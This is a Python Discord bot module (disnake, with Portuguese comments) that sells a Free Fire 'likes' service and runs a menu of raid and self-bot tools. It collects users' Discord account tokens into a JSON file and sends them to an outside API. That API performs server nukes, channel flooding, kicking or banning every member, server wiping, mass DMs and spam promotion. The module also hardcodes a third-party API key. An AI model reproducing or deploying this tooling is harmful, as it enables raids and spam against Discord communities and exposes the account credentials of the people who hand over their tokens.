import disnake
from disnake.ext import commands
import json
import os
import aiohttp
import urllib.parse
from datetime import datetime, timedelta
from Functions.CarregarEmojis import *

# Definição dos caminhos para os arquivos de configuração e dados
TOKENS_PATH = os.path.join("Database", "Vendas", "tokens.json")
TOOLS_CONFIG_PATH = os.path.join("Database", "Vendas", "tools_config.json")
MAIN_CONFIG_PATH = os.path.join("Database", "Vendas", "configuracao.json")
COOLDOWNS_PATH = os.path.join("Database", "Vendas", "cooldowns.json")

def obter_json(path):
    """
    Função para ler um arquivo JSON. Se o arquivo ou o diretório não existirem,
    cria-os e retorna um dicionário vazio.
    """
    if not os.path.exists(os.path.dirname(path)):
        os.makedirs(os.path.dirname(path))
    if not os.path.exists(path):
        with open(path, "w", encoding="utf-8") as f:
            json.dump({}, f)
        return {}
    try:
        with open(path, "r", encoding="utf-8") as f:
            return json.load(f)
    except (json.JSONDecodeError, FileNotFoundError):
        return {}

def salvar_json(data, path):
    """
    Função para salvar dados em um arquivo JSON.
    """
    with open(path, "w", encoding="utf-8") as f:
        json.dump(data, f, indent=4)

class LikeFFModal(disnake.ui.Modal):
    """
    Modal para o envio de likes no Free Fire. Solicita o ID do jogador e a região.
    """
    def __init__(self):
        components = [
            disnake.ui.TextInput(label="Seu ID de jogador do Free Fire", custom_id="uid", style=disnake.TextInputStyle.short, placeholder="Digite o seu User ID numérico", required=True),
            disnake.ui.TextInput(label="Região da sua conta", custom_id="region", style=disnake.TextInputStyle.short, placeholder="Ex: BR, NA, SA, EU, etc.", max_length=5, required=True),
        ]
        super().__init__(title="Enviar Likes Free Fire", components=components)

    async def callback(self, inter: disnake.ModalInteraction):
        """
        Chamado quando o modal é enviado. Processa os dados e faz a requisição à API.
        """
        await inter.response.defer(ephemeral=True) 
        uid, region = inter.text_values["uid"], inter.text_values["region"].upper()
        api_key = "bc3b3388cf9c51a62b14ac3ddb7f658cf996c0294317b647c3029eb222afda3dc49357786066dc32d3df9eec23976855c9ac49275e9b536860965f8a9e09bd0c986c53e43c8b1c9e9427fd84803feb8f674ede960e38eac0907a178a4cc8ed65e5a9cdcff34f788fb0d8061c9d396ddba5bf699bcb60f569c37924bdcd2703ba"
        api_url = f"https://getvyenx.cloud/free-fire/send-likes?uid={uid}&apikey={api_key}&region={region}"
        
        async with aiohttp.ClientSession() as session:
            try:
                async with session.get(api_url) as response:
                    if response.status == 200:
                        api_data = await response.json()
                        resultado_msg = api_data.get("message", "Nenhuma mensagem de resultado recebida.")
                        if "sucesso" in resultado_msg.lower():
                            cooldowns = obter_json(COOLDOWNS_PATH)
                            cooldowns[str(inter.author.id)] = datetime.now().timestamp()
                            salvar_json(cooldowns, COOLDOWNS_PATH)
                        await inter.followup.send(f"**Resultado do Envio:**\n```{resultado_msg}```", ephemeral=True)
                    else:
                        await inter.followup.send(f"{negativo} A API retornou um erro (Código: {response.status}).", ephemeral=True)
            except Exception as e:
                await inter.followup.send(f"{negativo} Ocorreu um erro ao se conectar à API: {e}", ephemeral=True)

class ToolModal(disnake.ui.Modal):
    """
    Classe genérica para modais de ferramentas, permitindo customização de título,
    ID e componentes.
    """
    def __init__(self, title, custom_id, components):
        super().__init__(title=title, custom_id=custom_id, components=components)

class PedirEstoqueModal(disnake.ui.Modal):
    """
    Modal para os usuários fazerem pedidos de estoque de produtos.
    """
    def __init__(self, bot):
        self.bot = bot
        components = [
            disnake.ui.TextInput(label="Qual produto você deseja?", custom_id="produto", style=disnake.TextInputStyle.short, placeholder="Ex: Conta de Fortnite, 1.000 V-Bucks, etc.", required=True),
            disnake.ui.TextInput(label="Qual o valor que você pagaria?", custom_id="preco", style=disnake.TextInputStyle.short, placeholder="Ex: R$ 50,00", required=True),
        ]
        super().__init__(title="Fazer um Pedido de Estoque", components=components)

    async def callback(self, inter: disnake.ModalInteraction):
        """
        Chamado quando o modal de pedido de estoque é enviado. Envia um log para um canal específico.
        """
        await inter.response.defer(ephemeral=True)
        
        produto = inter.text_values["produto"]
        preco = inter.text_values["preco"]
        
        config = obter_json(MAIN_CONFIG_PATH)
        log_channel_id = config.get("extensoes", {}).get("tools", {}).get("estoque_system", {}).get("idCanalLogs")

        if not log_channel_id:
            await inter.followup.send(f"{negativo} O sistema de pedido de estoque não foi configurado corretamente pelo administrador.", ephemeral=True)
            return
            
        log_channel = self.bot.get_channel(log_channel_id)
        if not log_channel:
            await inter.followup.send(f"{negativo} O canal de logs para pedidos de estoque não foi encontrado.", ephemeral=True)
            return

        embed = disnake.Embed(
            title="📦 Novo Pedido de Estoque",
            description=f"O membro {inter.author.mention} fez um novo pedido de produto.",
            color=disnake.Color.blue()
        )
        embed.set_author(name=f"{inter.author.name} (ID: {inter.author.id})", icon_url=inter.author.display_avatar.url)
        embed.set_thumbnail(url=inter.author.display_avatar.url)
        embed.add_field(name="Produto Solicitado", value=f"```{produto}```", inline=False)
        embed.add_field(name="Valor Oferecido", value=f"```{preco}```", inline=False)
        embed.set_footer(text=f"Pedido feito em: {datetime.now().strftime('%d/%m/%Y às %H:%M:%S')}")

        try:
            await log_channel.send(embed=embed)
            await inter.followup.send(f"{positivo} Seu pedido de estoque foi enviado com sucesso!", ephemeral=True)
        except Exception as e:
            await inter.followup.send(f"{negativo} Ocorreu um erro ao enviar seu pedido para o canal de logs: {e}", ephemeral=True)


class OnLikeAndTools(commands.Cog):
    """
    Cog principal que lida com interações de botões e seleções de dropdown
    para funcionalidades de Free Fire e outras ferramentas.
    """
    def __init__(self, bot: commands.Bot):
        self.bot = bot
        self.api_session = None

    async def _get_session(self):
        """
        Obtém ou cria uma sessão aiohttp.ClientSession para evitar múltiplas sessões.
        """
        if self.api_session is None or self.api_session.closed:
            self.api_session = aiohttp.ClientSession()
        return self.api_session

    def cog_unload(self):
        """
        Garante que a sessão aiohttp seja fechada quando o cog é descarregado.
        """
        if self.api_session:
            self.bot.loop.create_task(self.api_session.close())

    async def _enviar_log(self, inter: disnake.Interaction, funcao_usada: str):
        """
        Envia um log de utilização de ferramenta para um canal configurado.
        """
        config = obter_json(MAIN_CONFIG_PATH)
        log_channel_id = config.get("extensoes", {}).get("tools", {}).get("ferramentas_system", {}).get("idCanalLogs")
        if not log_channel_id:
            return
        log_channel = self.bot.get_channel(log_channel_id)
        if not log_channel:
            return
        embed = disnake.Embed(
            title="Log de Utilização de Ferramenta",
            description=f"O usuário {inter.author.mention} usou a função **`{funcao_usada}`**.",
            color=disnake.Color.from_rgb(255, 193, 7) # Cor amarela
        )
        embed.set_author(name=f"{inter.author.name} (ID: {inter.author.id})", icon_url=inter.author.display_avatar.url)
        embed.set_thumbnail(url=inter.author.display_avatar.url)
        embed.set_footer(text=f"Horário: {datetime.now().strftime('%d/%m/%Y às %H:%M:%S')}")
        try:
            await log_channel.send(embed=embed)
        except Exception:
            pass 

    async def _fazer_request_api(self, inter: disnake.Interaction, endpoint: str, nome_funcao: str):
        """
        Função auxiliar para fazer requisições à API de ferramentas.
        """
        await inter.response.defer(ephemeral=True)

        tools_config = obter_json(TOOLS_CONFIG_PATH)
        api_key = tools_config.get("apiKey")
        base_url = tools_config.get("baseUrl")

        if not api_key or not base_url:
            await inter.followup.send(
                f"{negativo} A configuração da API de ferramentas está incompleta. "
                f"É necessário definir 'apiKey' e 'baseUrl' no arquivo `tools_config.json`. "
                f"Por favor, contate um administrador.",
                ephemeral=True
            )
            return

        tokens = obter_json(TOKENS_PATH)
        user_id = str(inter.user.id)
        token = tokens.get(user_id)
        if not token:
            await inter.followup.send(f"{negativo} Você precisa configurar um token para usar esta função.", ephemeral=True)
            return
        
        endpoint = endpoint.replace("{token}", token)
        
        if hasattr(inter, 'text_values'):
            for key, value in inter.text_values.items():
                encoded_value = urllib.parse.quote(str(value))
                endpoint = endpoint.replace(f"{{{key}}}", encoded_value)
        
        if '?' in endpoint:
            url = f"{base_url}/api/{endpoint}&apiKey={api_key}"
        else:
            url = f"{base_url}/api/{endpoint}?apiKey={api_key}"
        
        session = await self._get_session()
        try:
            async with session.get(url) as response:
                response_text = await response.text()
                
                if response.ok:
                    await inter.followup.send(f"{positivo} Ação iniciada com sucesso!", ephemeral=True)
                    await self._enviar_log(inter, nome_funcao)
                else:
                    try:
                        data = json.loads(response_text)
                        err = data.get("message", data.get("error", "Erro desconhecido."))
                    except json.JSONDecodeError:
                        err = response_text if response_text else f"Código de Status: {response.status}"
                    await inter.followup.send(f"{negativo} Erro na API: `{err}`", ephemeral=True)
        except aiohttp.ClientConnectorError as e:
            await inter.followup.send(f"{negativo} Erro de conexão com a API. Verifique se a `baseUrl` configurada está correta e online. Detalhes: {e}", ephemeral=True)
        except Exception as e:
            await inter.followup.send(f"{negativo} Erro ao se comunicar com a API: {e}", ephemeral=True)

    @commands.Cog.listener("on_button_click")
    async def interaction_button_listener(self, inter: disnake.MessageInteraction):
        """
        Este listener é acionado quando um botão é clicado.
        Ele verifica o custom_id do botão e executa a ação correspondente.
        """
        custom_id = inter.component.custom_id
        
        if custom_id == "likefreefiresend":
            config = obter_json(MAIN_CONFIG_PATH)
            ext_config = config.get('extensoes', {}).get('like_ff', {})
            cargo_id = ext_config.get("idCargo")
            
            if not cargo_id:
                return await inter.response.send_message(f"{negativo} O administrador não configurou um cargo de permissão para o sistema de likes.", ephemeral=True)
            
            try:
                cargo_id = int(cargo_id)
            except (ValueError, TypeError):
                return await inter.response.send_message(f"{negativo} O ID do cargo configurado não é um número válido.", ephemeral=True)

            required_role = inter.guild.get_role(cargo_id)
            if not required_role:
                return await inter.response.send_message(f"{negativo} O cargo de permissão configurado não foi encontrado no servidor. Peça ao administrador para verificar o ID.", ephemeral=True)
            
            if required_role not in inter.author.roles:
                return await inter.response.send_message(f"{negativo} Você precisa do cargo {required_role.mention} para usar esta função.", ephemeral=True)
            
            cooldowns = obter_json(COOLDOWNS_PATH)
            user_id_str = str(inter.author.id)
            
            if user_id_str in cooldowns:
                last_use_time = datetime.fromtimestamp(cooldowns[user_id_str])
                if datetime.now() < last_use_time + timedelta(hours=24):
                    tempo_restante = (last_use_time + timedelta(hours=24)) - datetime.now()
                    horas, rem = divmod(int(tempo_restante.total_seconds()), 3600)
                    minutos, _ = divmod(rem, 60)
                    return await inter.response.send_message(f"{clock} Aguarde **{horas}h e {minutos}m** para usar novamente.", ephemeral=True)
            
            await inter.response.send_modal(modal=LikeFFModal())
        
        elif custom_id == "estoque_pedir_btn":
            await inter.response.send_modal(modal=PedirEstoqueModal(bot=self.bot))

    @commands.Cog.listener("on_dropdown")
    async def tools_select_listener(self, inter: disnake.MessageInteraction):
        """
        Este listener é acionado quando um item de um dropdown (select menu) é selecionado.
        Ele lida com a lógica para as ferramentas diversas.
        """
        if inter.component.custom_id != "funcoes_select":
            return

        value = inter.values[0]
        
        main_config = obter_json(MAIN_CONFIG_PATH)
        perm_role_id = main_config.get("extensoes", {}).get("tools", {}).get("ferramentas_system", {}).get("idCargoPermissao")
        
        if perm_role_id:
            try:
                perm_role_id = int(perm_role_id)
            except (ValueError, TypeError):
                return await inter.response.send_message(f"{negativo} O ID do cargo de permissão para ferramentas não é válido.", ephemeral=True)

            required_role = inter.guild.get_role(perm_role_id)
            if required_role and required_role not in inter.author.roles:
                return await inter.response.send_message(f"{negativo} Você precisa do cargo {required_role.mention} para usar esta ferramenta.", ephemeral=True)

        user_id_str = str(inter.user.id)
        tokens = obter_json(TOKENS_PATH)

        if value == "configurar_token":
            return await inter.response.send_modal(ToolModal("Configurar Token", "modal_configurar_token", [disnake.ui.TextInput(label="Insira seu token de usuário", custom_id="user_token", style=disnake.TextInputStyle.short)]))
        
        if user_id_str not in tokens:
            return await inter.response.send_message(f"{negativo} Você precisa configurar seu token primeiro! Use a opção **'Configurar Token'** do menu.", ephemeral=True)

        modal_map = {
            "limpar_dm": ToolModal("Limpar DM Específica", "modal_limpar_dm", [disnake.ui.TextInput(label="ID do Canal (DM)", custom_id="channel_id", style=disnake.TextInputStyle.short)]),
            "divulgacao": ToolModal("Divulgação em Massa", "modal_divulgacao", [disnake.ui.TextInput(label="ID do Servidor", custom_id="guild_id", style=disnake.TextInputStyle.short), disnake.ui.TextInput(label="Mensagem", custom_id="mensagem", style=disnake.TextInputStyle.paragraph)]),
            "farm_kosame": ToolModal("Farm Kosame", "modal_farm_kosame", [disnake.ui.TextInput(label="ID do Servidor", custom_id="guild_id", style=disnake.TextInputStyle.short), disnake.ui.TextInput(label="ID do Canal", custom_id="channel_id", style=disnake.TextInputStyle.short)]),
            "farm_disboard": ToolModal("Farm Disboard", "modal_farm_disboard", [disnake.ui.TextInput(label="ID do Servidor", custom_id="guild_id", style=disnake.TextInputStyle.short), disnake.ui.TextInput(label="ID do Canal", custom_id="channel_id", style=disnake.TextInputStyle.short)]),
            "raid_controller": ToolModal("Raid Controller", "modal_raid_controller", [disnake.ui.TextInput(label="ID do Servidor", custom_id="guild_id", style=disnake.TextInputStyle.short), disnake.ui.TextInput(label="Nome dos canais", custom_id="new_channel_name", style=disnake.TextInputStyle.short), disnake.ui.TextInput(label="Mensagem do Flood", custom_id="flood_message", style=disnake.TextInputStyle.short)]),
            "mass_dm": ToolModal("Mensagem em Massa para DMs", "modal_mass_dm", [disnake.ui.TextInput(label="Mensagem", custom_id="message_content", style=disnake.TextInputStyle.paragraph)]),
            "flood_channels": ToolModal("Floodar Canais", "modal_flood_channels", [disnake.ui.TextInput(label="ID do Servidor", custom_id="guild_id", style=disnake.TextInputStyle.short), disnake.ui.TextInput(label="Mensagem", custom_id="message_content", style=disnake.TextInputStyle.paragraph)]),
            "kick_all_members": ToolModal("Expulsar Todos", "modal_kick_all_members", [disnake.ui.TextInput(label="ID do Servidor", custom_id="guild_id", style=disnake.TextInputStyle.short)]),
            "ban_all_members": ToolModal("Banir Todos", "modal_ban_all_members", [disnake.ui.TextInput(label="ID do Servidor", custom_id="guild_id", style=disnake.TextInputStyle.short)]),
            "clear_server": ToolModal("Limpar Servidor", "modal_clear_server", [disnake.ui.TextInput(label="ID do Servidor", custom_id="guild_id", style=disnake.TextInputStyle.short)]),
        }
        if value in modal_map:
            await self._enviar_log(inter, modal_map[value].title)
            await inter.response.send_modal(modal_map[value])
            return

        action_map = {
            "limpar_dms": ("clearAllDms/{token}", "Limpar Todas as DMs"),
            "fechar_dms": ("closeDms/{token}", "Fechar Todas as DMs"),
            "abrir_dms": ("openDms/{token}", "Abrir Todas as DMs"),
            "limpar_servidores": ("leaveServers/{token}", "Sair de Todos os Servidores"),
            "remover_amizades": ("removeFriends/{token}", "Remover Todas as Amizades"),
            "sair_grupos": ("leaveGroupDms/{token}", "Sair de Todos os Grupos"),
            "delete_owned_servers": ("deleteOwnedServers/{token}", "Deletar Servidores Próprios"),
        }
        if value in action_map:
            endpoint, nome_funcao = action_map[value]
            await self._fazer_request_api(inter, endpoint, nome_funcao)
            return

    @commands.Cog.listener("on_modal_submit")
    async def tools_modal_submit_listener(self, inter: disnake.ModalInteraction):
        """
        Este listener é acionado quando um modal é enviado.
        Ele lida com o processamento dos dados dos modais das ferramentas.
        """
        if inter.custom_id == "modal_configurar_token":
            token = inter.text_values["user_token"]
            tokens = obter_json(TOKENS_PATH)
            tokens[str(inter.user.id)] = token
            salvar_json(tokens, TOKENS_PATH)
            await inter.response.send_message(f"{positivo} Token salvo com sucesso!", ephemeral=True)
            return

        endpoint_map = {
            "modal_limpar_dm": ("clearDm/{token}/{channel_id}", "Limpar DM Específica"),
            "modal_divulgacao": ("divulgar?guildId={guild_id}&mensagem={mensagem}", "Divulgação em Massa"),
            "modal_farm_kosame": ("farmKosame?guildId={guild_id}&channelId={channel_id}", "Farmar Kosame"),
            "modal_farm_disboard": ("bumpDisboard?guildId={guild_id}&channelId={channel_id}", "Farmar Disboard"),
            "modal_raid_controller": ("nukeServer/{token}?guildId={guild_id}&newChannelName={new_channel_name}&floodMessage={flood_message}", "Raid (Nuke)"),
            "modal_mass_dm": ("massDm/{token}?messageContent={message_content}", "Disparar DM em Massa"),
            "modal_flood_channels": ("floodChannels/{token}?messageContent={message_content}&guildId={guild_id}", "Floodar Canais"),
            "modal_kick_all_members": ("kickAllMembers/{token}?guildId={guild_id}", "Expulsar Todos os Membros"),
            "modal_ban_all_members": ("banAllMembers/{token}?guildId={guild_id}", "Banir Todos os Membros"),
            "modal_clear_server": ("clearServer/{token}?guildId={guild_id}", "Limpar Servidor"),
        }
        
        if inter.custom_id in endpoint_map:
            endpoint, nome_funcao = endpoint_map[inter.custom_id]
            await self._fazer_request_api(inter, endpoint, nome_funcao)

def setup(bot):
    """
    Função de setup para adicionar o cog ao bot.
    """
    bot.add_cog(OnLikeAndTools(bot))